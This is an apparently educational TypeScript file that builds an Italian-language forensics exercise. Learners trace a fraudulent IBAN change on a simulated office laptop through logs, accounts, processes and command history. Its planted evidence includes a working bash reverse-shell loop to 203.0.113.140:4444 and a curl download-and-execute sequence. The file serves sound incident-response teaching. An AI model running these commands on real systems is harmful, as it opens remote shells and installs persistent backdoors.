// Scena del crimine digitale: un computer da investigare che cresce con il corso.
//
// Non è un elenco di domande: è una copia del disco di un computer, con cartelle, file,
// account, la fotografia dei processi, i log e la cronologia dei comandi. Chi indaga
// formula un'ipotesi, raccoglie prove (le registra con "prova", che ne calcola l'impronta),
// segnala gli indizi con "report" e alla fine ricostruisce la timeline e dice cosa può
// affermare. Gli indizi entrano in gioco solo quando il corso ha spiegato ciò che serve
// per trovarli (campo `after`): la stessa scena, rigiocata più avanti, racconta di più.
//
// Si lavora su una COPIA del disco (in sola lettura), come in un'indagine vera: l'originale
// non si tocca.

import type { Shell } from '../engine/shell';
import { sha256 } from '../engine/sha256';
import type { Operation } from './operations';

const BASE = 'scena/sc01';

const SYNC = ['#!/bin/bash', '# NightTunnel: apre un canale verso il server di chi lo controlla', 'while true; do', '  bash -i >& /dev/tcp/203.0.113.140/4444 0>&1', '  sleep 60', 'done'].join('\n') + '\n';

export const SC01: Operation = {
  id: 'sc01',
  code: 'SC-01',
  title: 'Il portatile dell\'ufficio',
  client: 'Mama Reyes, Lo Scantinato',
  kind: 'scena',
  requires: 'ch01-m5',
  xp: 300,
  brief: `Lunedì, le nove. Mama ha la faccia di chi non ha dormito.

@mama: Il birrificio Broseph mi ha chiamato: il pagamento di sabato non è mai arrivato. Duemilaquattrocento eddies. Il bonifico parte da solo, con l'IBAN scritto nel file dei fornitori sul portatile dell'ufficio. E l'IBAN nel file non è più il loro.

@nyx: Rook ha fatto una **copia del disco** del portatile e l'ha messa sul tuo deck, in \`${BASE}\`. Si lavora sempre su una copia: l'originale resta com'è, perché potrebbe servire alla polizia. La copia è in sola lettura.

@nyx: Il lavoro: capire **cosa è successo, quando e come**. Segnala ogni indizio con \`report\` e, quando te lo chiedo, registra le prove con \`prova FILE\`: il deck ne calcola l'impronta e la annota, così nessuno potrà dire che le hai cambiate.

?? Alcuni indizi richiedono cose che il corso non ti ha ancora spiegato: restano chiusi, e si aprono quando le avrai studiate. Puoi tornare su questa scena tutte le volte che vuoi.`,
  scope: [`Copia del disco del portatile dell'ufficio, in ~/${BASE} (sola lettura)`, 'Indagine: non serve modificare niente'],
  scene: {
    hypotheses: [
      'Un errore: qualcuno ha scritto l\'IBAN sbagliato',
      'Il birrificio ha davvero cambiato banca e se ne è dimenticato',
      'Una truffa: qualcuno ha cambiato l\'IBAN apposta per prendersi i soldi',
      'Non lo so ancora: prima voglio vedere le prove',
    ],
    conclusions: [
      { text: 'Jackie ha sbagliato a scrivere l\'IBAN mentre aggiornava il file', after: null },
      { text: 'Il birrificio ha cambiato banca: il file è giusto, il problema è loro', after: null },
      { text: 'Il file dei fornitori è stato modificato sabato notte e l\'IBAN di Broseph sostituito; dai soli file non si può ancora dire chi è stato', after: 'ch01-m5' },
      { text: 'Qualcuno con un account nuovo, "tecnico", ha cambiato il file e ha lasciato un programma acceso: non è un errore di un dipendente', after: 'ch03-m3' },
      { text: 'Un intruso è entrato da 203.0.113.140 con la password di Jackie, ha creato l\'account "tecnico", ha cambiato l\'IBAN per dirottare il pagamento e ha lasciato un accesso nascosto', after: 'ch04-m2' },
    ],
  },
  findings: [
    {
      id: 'backup',
      after: 'ch01-m5',
      title: 'Una copia del file dei fornitori con i dati originali',
      answers: ['.fornitori.txt.bak', `${BASE}/home/jackie/Documenti/.fornitori.txt.bak`, '/home/jackie/Documenti/.fornitori.txt.bak'],
      hints: [`Il file dei fornitori è nella home di Jackie: ${BASE}/home/jackie/Documenti. Qualche file potrebbe essere nascosto.`, `ls -la ${BASE}/home/jackie/Documenti`, 'report .fornitori.txt.bak'],
      explain: 'Una copia nascosta (il nome comincia con il punto) del 10 novembre: contiene i dati **prima** della modifica. Confrontare la versione sospetta con una copia sicura è il primo gesto di chi indaga.',
    },
    {
      id: 'iban',
      after: 'ch01-m5',
      time: '01:15',
      event: 'L\'IBAN di Broseph viene sostituito in fornitori.txt',
      title: 'L\'IBAN inserito al posto di quello vero',
      answers: ['NC99 6666 0101 2077 1313', 'nc99666601012077 1313', 'nc996666010120771313'],
      hints: ['Confronta la riga di Broseph nei due file: quello attuale e la copia nascosta.', `cat ${BASE}/home/jackie/Documenti/fornitori.txt`, 'report NC99 6666 0101 2077 1313'],
      explain: 'Era `NC77 0420 1984 0000 5521`, ora è `NC99 6666 0101 2077 1313`. E guarda con `ls -l` la data del file: **15 novembre, 01:15**. Sabato notte, a bar chiuso. Questo è il primo punto della timeline.',
    },
    {
      id: 'account',
      after: 'ch03-m1',
      time: '01:03',
      event: 'Viene creato l\'account "tecnico"',
      title: 'Un account che nessuno in ufficio ricorda di aver creato',
      answers: ['tecnico'],
      hints: [`Gli utenti del portatile sono in ${BASE}/etc/passwd.`, `cat ${BASE}/etc/passwd: chi non è né Mama né Jackie?`, 'report tecnico'],
      explain: 'L\'utente `tecnico` (UID 1003) non è di nessuno dello staff. Un account in più, creato di nascosto, serve a chi è entrato per **tornare** quando vuole: si chiama persistenza.',
    },
    {
      id: 'perms',
      after: 'ch03-m2',
      title: 'Perché chiunque, sul portatile, poteva modificare il file dei fornitori',
      answers: ['rw-rw-rw-', '666', '-rw-rw-rw-'],
      hints: ['Guarda i permessi del file dei fornitori.', `ls -l ${BASE}/home/jackie/Documenti/fornitori.txt`, 'report rw-rw-rw-'],
      explain: '`rw-rw-rw-` (666): leggibile e **modificabile da qualsiasi utente**, compreso il nuovo `tecnico`, senza bisogno di poteri da amministratore. Con `rw-r-----` l\'intruso avrebbe dovuto fare un passo in più, e lasciare un\'altra traccia.',
    },
    {
      id: 'process',
      after: 'ch03-m3',
      time: '01:20',
      event: 'Parte un programma nascosto di "tecnico"',
      title: 'Il programma lasciato acceso dall\'intruso',
      answers: [`${BASE}/home/tecnico/.local/sync`, '/home/tecnico/.local/sync', '.local/sync'],
      hints: [`Rook ha fotografato i processi alle 08:45: ${BASE}/root/raccolta/processi.txt.`, `grep tecnico ${BASE}/root/raccolta/processi.txt`, 'report /home/tecnico/.local/sync'],
      explain: 'Un processo di `tecnico`, partito alle 01:20, da una cartella nascosta (`.local`), che si collega a `203.0.113.140`. Un programma da una cartella nascosta che parla con l\'esterno è un **indicatore di compromissione** da manuale.',
    },
    {
      id: 'ip',
      after: 'ch04-m2',
      time: '00:58',
      event: 'Login come jackie da 203.0.113.140, al secondo tentativo',
      title: 'L\'indirizzo da cui è entrato l\'intruso',
      answers: ['203.0.113.140'],
      hints: [`Il registro degli accessi è in ${BASE}/var/log/auth.log.`, `grep Accepted ${BASE}/var/log/auth.log: quale accesso non viene dalla rete del bar (192.168.1.x)?`, 'report 203.0.113.140'],
      explain: 'Un solo tentativo sbagliato e poi la password **giusta** di Jackie, da un indirizzo esterno, alle 00:58. Non è un brute force: l\'intruso **conosceva già** la password. Jackie la usava anche su un sito di giochi violato l\'anno scorso: è il credential stuffing del capitolo F. Poi, con i poteri sudo di Jackie, alle 01:03 crea `tecnico`.',
    },
    {
      id: 'repertato',
      after: 'ch04-m3',
      evidence: `${BASE}/home/jackie/Documenti/fornitori.txt`,
      title: 'Registra come prova il file dei fornitori modificato (comando "prova")',
      answers: [],
      hints: ['Il comando prova calcola l\'impronta del file e la annota nel registro delle prove.', `prova ${BASE}/home/jackie/Documenti/fornitori.txt`],
      explain: 'Prova registrata, con la sua impronta SHA-256. Se un giorno qualcuno dicesse "quel file l\'hai cambiato tu", ricalcolare l\'impronta e trovarla uguale dimostra il contrario. È la **catena di custodia**: chi ha raccolto cosa, quando, e la prova che non è cambiato.',
    },
    {
      id: 'history',
      after: 'ch04-m3',
      title: 'Il file che racconta, comando per comando, cosa ha fatto l\'intruso',
      answers: [`${BASE}/home/tecnico/.bash_history`, '/home/tecnico/.bash_history', '.bash_history'],
      hints: ['La shell ricorda i comandi di ogni utente in un file nascosto nella sua home.', `ls -la ${BASE}/home/tecnico`, 'report /home/tecnico/.bash_history'],
      explain: 'La **cronologia dei comandi** di `tecnico`: `nano fornitori.txt`, poi lo scaricamento e l\'avvio di `sync`. L\'ultimo comando, `history -c`, cercava di cancellarla, ma la copia sul disco era già stata scritta. Gli intrusi sbagliano anche loro.',
    },
    {
      id: 'ioc',
      after: 'ch06-m2',
      title: 'Il nome del programma, dall\'elenco degli indicatori noti',
      answers: ['NightTunnel', 'nighttunnel'],
      hints: [`Calcola l'impronta del programma e cercala in ${BASE}/../indicatori.txt.`, `sha256sum ${BASE}/home/tecnico/.local/sync, poi cat scena/indicatori.txt`, 'report NightTunnel'],
      explain: 'L\'impronta di `sync` coincide con quella di **NightTunnel**, un programma di accesso remoto già visto in altri attacchi. Gli **indicatori di compromissione** condivisi tra aziende (impronte, indirizzi, nomi) servono proprio a riconoscere in un attimo un attrezzo già noto.',
    },
  ],
  debrief: `@nyx: Ecco cosa hai ricostruito. Mama ora sa cosa dire alla banca, alla polizia e a Broseph.

Le azioni da consigliare:
- **subito**: avvisare la banca per tentare di bloccare il bonifico; denuncia alla Polizia Postale, con la copia del disco e il registro delle prove
- **contenimento**: staccare il portatile dalla rete, disattivare \`tecnico\`, cambiare la password di Jackie (e ovunque la usasse)
- **eradicazione**: dopo aver conservato le prove, rimuovere \`sync\` e l'account
- **lezioni apprese**: password diversa per ogni servizio, MFA sull'accesso remoto, permessi \`rw-r-----\` sul file dei fornitori, e una telefonata al fornitore prima di ogni cambio IBAN

?? Se hai giocato la scena presto nel corso, alcuni indizi erano chiusi. Torna dopo i capitoli 03, 04 e 06: la stessa scena racconterà molto di più.`,
  setup(sh: Shell) {
    const root = `${sh.home}/${BASE}`;
    const ro = { owner: 'root', group: 'root', perms: 'r--r--r--' };
    const w = (rel: string, text: string, o: { perms?: string; mtime?: string; owner?: string } = {}) => sh.localFs.writeFile(`${root}/${rel}`, text, { ...ro, ...o });
    w(
      'NOTA-DI-MAMA.txt',
      [
        'Lunedì mattina, 08:30.',
        'Broseph dice che il pagamento di sabato (2.400 eddies) non è arrivato.',
        'Il bonifico automatico usa l\'IBAN scritto in home/jackie/Documenti/fornitori.txt.',
        'Venerdì sera il file era giusto: l\'ho controllato io.',
        'Sul portatile lavoriamo io e Jackie. Nessun altro.',
        '-- Mama',
      ].join('\n') + '\n',
    );
    const rows = (broseph: string) =>
      ['FORNITORI - Lo Scantinato', '', 'Birrificio Broseph     IBAN ' + broseph, 'Noodle Kenji           IBAN NC12 3300 4411 0000 7788', 'Ottica Neon (magliette) IBAN NC45 9090 1212 0000 3434'].join('\n') + '\n';
    w('home/jackie/Documenti/fornitori.txt', rows('NC99 6666 0101 2077 1313'), { perms: 'rw-rw-rw-', mtime: 'Nov 15 01:15', owner: 'jackie' });
    w('home/jackie/Documenti/.fornitori.txt.bak', rows('NC77 0420 1984 0000 5521'), { perms: 'rw-r--r--', mtime: 'Nov 10 18:02', owner: 'jackie' });
    w('home/jackie/Documenti/menu-autunno.txt', 'Zuppa di miso sintetica\nNoodles al neon\n', { mtime: 'Nov 12 16:40', owner: 'jackie' });
    w('home/mama/promemoria.txt', 'Pagare Broseph sabato (automatico)\nChiamare il tecnico del jukebox\n', { mtime: 'Nov 13 11:05', owner: 'mama' });
    w(
      'etc/passwd',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'syslog:x:104:110::/home/syslog:/usr/sbin/nologin',
        'mama:x:1001:1001:Mama Reyes:/home/mama:/bin/bash',
        'jackie:x:1002:1002:Jackie:/home/jackie:/bin/bash',
        'tecnico:x:1003:1003::/home/tecnico:/bin/bash',
      ].join('\n') + '\n',
    );
    w('etc/group', ['root:x:0:', 'sudo:x:27:jackie', 'mama:x:1001:', 'jackie:x:1002:', 'tecnico:x:1003:'].join('\n') + '\n');
    w(
      'var/log/auth.log',
      [
        'Nov 14 18:30:02 ufficio sshd[1904]: Accepted publickey for mama from 192.168.1.12 port 50110 ssh2',
        'Nov 14 22:15:40 ufficio sshd[1990]: Accepted password for jackie from 192.168.1.15 port 50422 ssh2',
        'Nov 14 23:02:11 ufficio sshd[1990]: pam_unix(sshd:session): session closed for user jackie',
        'Nov 15 00:58:31 ufficio sshd[2201]: Failed password for jackie from 203.0.113.140 port 40112 ssh2',
        'Nov 15 00:58:40 ufficio sshd[2202]: Accepted password for jackie from 203.0.113.140 port 40114 ssh2',
        'Nov 15 01:03:12 ufficio sudo:   jackie : TTY=pts/0 ; PWD=/home/jackie ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash tecnico',
        'Nov 15 01:03:20 ufficio sudo:   jackie : TTY=pts/0 ; PWD=/home/jackie ; USER=root ; COMMAND=/usr/bin/passwd tecnico',
        'Nov 15 01:05:02 ufficio sshd[2202]: pam_unix(sshd:session): session closed for user jackie',
        'Nov 15 01:12:05 ufficio sshd[2240]: Accepted password for tecnico from 203.0.113.140 port 40130 ssh2',
        'Nov 15 01:24:50 ufficio sshd[2240]: pam_unix(sshd:session): session closed for user tecnico',
        'Nov 17 08:31:15 ufficio sshd[2602]: Accepted publickey for mama from 192.168.1.12 port 50190 ssh2',
      ].join('\n') + '\n',
    );
    w(
      'home/tecnico/.bash_history',
      ['cd /home/jackie/Documenti', 'nano fornitori.txt', 'mkdir -p ~/.local', 'curl -s http://203.0.113.140/sync -o ~/.local/sync', 'chmod +x ~/.local/sync', 'nohup ~/.local/sync &', 'history -c'].join('\n') + '\n',
      { mtime: 'Nov 15 01:24', owner: 'tecnico' },
    );
    w('home/tecnico/.local/sync', SYNC, { perms: 'r-xr-xr-x', mtime: 'Nov 15 01:19', owner: 'tecnico' });
    w(
      'root/raccolta/LEGGIMI.txt',
      'Raccolta del primo intervento (Rook), lunedì 08:45, prima di spegnere il portatile.\nprocessi.txt = fotografia dei processi in esecuzione (ps aux).\n',
    );
    w(
      'root/raccolta/processi.txt',
      [
        'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
        'root           1  0.0  0.3 167744 12020 ?        Ss   Nov14   0:02 /sbin/init',
        'root         402  0.0  0.1  10224  4096 ?        Ss   Nov14   0:00 /usr/sbin/cron -f',
        'root         455  0.0  0.2  15432  8800 ?        Ss   Nov14   0:00 sshd: /usr/sbin/sshd -D',
        'syslog       470  0.0  0.1 222400  5120 ?        Ssl  Nov14   0:01 /usr/sbin/rsyslogd -n',
        'tecnico     2258  0.1  0.1   9800  3900 ?        S    01:20   0:03 /bin/bash /home/tecnico/.local/sync',
        'tecnico     2259  0.0  0.0   8600  3100 ?        S    01:20   0:00 bash -i 203.0.113.140:4444',
        'mama        2611  0.0  0.1   8600  5300 pts/0    Ss   08:31   0:00 -bash',
      ].join('\n') + '\n',
    );
    sh.localFs.writeFile(
      `${sh.home}/scena/indicatori.txt`,
      [
        '# Indicatori di compromissione condivisi (impronte SHA-256 di programmi malevoli noti)',
        `${sha256('#!/bin/bash\necho ciao\n')}  FakeUpdate`,
        `${sha256(SYNC)}  NightTunnel`,
        `${sha256('#!/bin/sh\nwhile :; do :; done\n')}  CpuBurner`,
      ].join('\n') + '\n',
      { owner: sh.user, group: sh.user },
    );
  },
};
